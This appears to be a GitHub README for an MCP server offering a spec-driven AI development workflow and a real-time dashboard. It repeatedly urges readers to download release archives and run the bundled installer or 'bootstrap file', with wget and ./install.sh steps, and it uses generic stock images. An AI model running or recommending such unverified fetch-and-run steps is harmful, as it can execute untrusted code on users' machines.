Spec Workflow MCP - Spec-Driven AI Dev with Live Dashboard
[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/ahmadhayatkhan22/spec-workflow-mcp/releases)

https://github.com/ahmadhayatkhan22/spec-workflow-mcp/releases

Hero image  
![AI Dashboard](https://images.unsplash.com/photo-1555949963-aa79dcee981d?auto=format&fit=crop&w=1600&q=60)

What this repo does
- Implements a Model Context Protocol (MCP) server.
- Provides a spec-driven workflow for AI-assisted software development.
- Ships a real-time web dashboard to monitor tasks, specs, agents, and progress.
- Exposes APIs, CLI tools, and connectors for CI/CD and local development.

Why this helps
- Keep specs as the single source of truth.
- Trace AI outputs back to spec and context.
- Track progress in real time with a dashboard.
- Automate developer handoffs and reviews.

Quick links
- Releases and installer: https://github.com/ahmadhayatkhan22/spec-workflow-mcp/releases
- Badge above links to the same page.

Download and run
- Visit the releases page above.
- Download the latest release asset named like `spec-workflow-mcp-<version>.tar.gz` or `spec-workflow-mcp-<version>.zip`.
- Extract the archive and run the included installer script `install.sh` or the packaged binary.
- Example steps you can run on a Linux host:
  - `wget https://github.com/ahmadhayatkhan22/spec-workflow-mcp/releases/download/<version>/spec-workflow-mcp-<version>.tar.gz`
  - `tar -xzf spec-workflow-mcp-<version>.tar.gz`
  - `cd spec-workflow-mcp-<version>`
  - `./install.sh`
- The release page contains the exact asset names. Download the asset and execute the provided bootstrap file.

Core features
- Spec-driven engine
  - Parse formal specs (YAML/JSON Schema).
  - Version specs and apply diffs in a controlled workflow.
  - Map spec items to tasks and agents.
- MCP runtime
  - Maintain model context state for each task.
  - Manage context updates from agents and humans.
  - Provide transactional context updates.
- Real-time dashboard
  - Live task streams, logs, and metrics.
  - Visual traces that link model outputs to spec lines.
  - Role-based views: engineer, reviewer, product manager.
- API and SDK
  - REST endpoints for task and spec management.
  - WebSocket channels for live updates.
  - SDKs for JavaScript and Python.
- Workflow automation
  - Hooks for CI/CD pipelines.
  - Preflight checks against specs.
  - Auto-assign agents and reviewers based on rules.

Architecture overview
![Architecture diagram](https://images.unsplash.com/photo-1526378723584-3b7fc3a8b25e?auto=format&fit=crop&w=1400&q=60)

- Frontend
  - React app with live updates via WebSocket.
  - Dashboard panels: Tasks, Specs, Agents, Trace Viewer.
- Backend
  - Node/Go service exposes REST and WebSocket APIs.
  - MCP engine that keeps per-task context and spec mapping.
- Storage
  - Use PostgreSQL for durable state.
  - Use Redis for pub/sub and caching.
- Integrations
  - GitHub: sync specs as files and open PRs automatically.
  - CI: run spec validation job.
  - LLM providers: plug in providers via connector interface.

Spec-driven workflow explained
- Write a machine-parseable spec. Use YAML or JSON Schema.
- Register the spec to the MCP server.
- The server generates tasks and test vectors from the spec.
- Assign tasks to AI agents or human reviewers.
- Agents produce outputs with context tokens. The MCP binds outputs to spec items.
- The dashboard shows the trace. Reviewers approve or request changes.
- Approved outputs can trigger merges in your repo via the GitHub connector.

Common terms
- Spec: A structured description of desired behavior or API.
- MCP: Model Context Protocol. A runtime contract that binds model outputs to context.
- Trace: A recorded connection between an output and the spec lines that influenced it.
- Agent: A worker that produces output. Could be an LLM or a human user.
- Task: A unit of work derived from a spec.

Getting started (local dev)
- Clone this repo.
- Start a local PostgreSQL and Redis instance.
- Install dependencies with your package manager.
- Run the MCP server in dev mode.
- Open the dashboard on `http://localhost:3000`.
- Use the CLI to register a sample spec.
- Example commands (replace with real values from releases if you use assets):
  - `./bin/mcp-server --env .env.development`
  - `./bin/mcp-cli spec upload ./examples/sample-spec.yaml`
- The project ships with example specs in `/examples`.

API highlights
- `POST /api/specs` — Create or update a spec.
- `GET /api/tasks` — List tasks with filters.
- `POST /api/tasks/:id/assign` — Assign an agent.
- `GET /api/trace/:taskId` — Retrieve trace for a task.
- WebSocket `/ws` — Subscribe to task streams and trace updates.

CLI
- `mcp-cli auth` — Authenticate with the server.
- `mcp-cli spec upload <file>` — Upload a spec to the server.
- `mcp-cli task run <task-id>` — Trigger a task run.
- `mcp-cli trace show <task-id>` — Print the trace to console.

Dashboard screens
- Overview
  - Active runs, throughput, failure rate.
- Spec Explorer
  - View spec tree, linked tasks, and test vectors.
- Trace Viewer
  - Time-sequence of model calls, inputs, outputs, and context deltas.
- Audit
  - Immutable log of approvals and actions.

Security and roles
- Role-based access control (RBAC).
- Scoped API keys for automation bots.
- Signed context updates to prevent forged traces.
- You can plug your own auth provider.

Deployment patterns
- Single-node for evaluation and demos.
- Clustered deployment for production with auto-scaling.
- Docker images available via releases. Download the image tarball from the releases page and load it into your registry.
- Kubernetes manifest examples are in `/deploy/k8s`.

Testing and validation
- Unit tests for MCP engine and parsers.
- Integration tests for API and WebSocket flows.
- End-to-end tests that simulate agent runs.
- Use the `examples/` folder to validate a full run.

Extending the system
- Add a connector for a new model provider.
- Write a custom spec parser for domain-specific languages.
- Extend dashboard widgets to show domain metrics.
- Implement autoscaling rules for agent pools.

Example spec snippet
- The repo includes sample specs. Load them to see the lifecycle.
- A spec maps endpoints, examples, and acceptance criteria to tasks.
- Each task contains test vectors for automated checks.

Troubleshooting tips
- If the dashboard shows stale data, check the Redis pub/sub.
- If tasks fail validation, re-run the spec linter.
- If an agent times out, inspect the agent logs and the model provider connector.

Contributing
- Fork the repo and open a PR.
- Keep change sets small and focused.
- Add tests for new features.
- Use conventional commits for changelog automation.
- See `CONTRIBUTING.md` for guidelines. Follow the issue templates.

Roadmap
- Fine-grained spec diffing and automated migrations.
- Multi-tenant support.
- More SDKs (Go, Rust).
- Native VS Code extension for spec editing and live preview.

License
- This repo uses an OSI-compatible license. See the `LICENSE` file for details.

Credits and resources
- Dashboard UI uses common open-source components.
- Parser logic draws on common schema tools.
- Images used in this README are from public image hosts for illustrative purposes.

Releases and installers
- Visit the releases page to download the packaged binaries and assets: https://github.com/ahmadhayatkhan22/spec-workflow-mcp/releases
- Download the release archive and execute the provided installer to get a runnable server and dashboard.

Contact and support
- Open issues on GitHub for bugs or feature requests.
- Submit PRs for improvements and fixes.

Assets
- Example specs: /examples
- Kubernetes manifests: /deploy/k8s
- SDK samples: /sdk/js, /sdk/py

Screenshots
![Tasks panel](https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1400&q=60)
![Trace viewer](https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1400&q=60)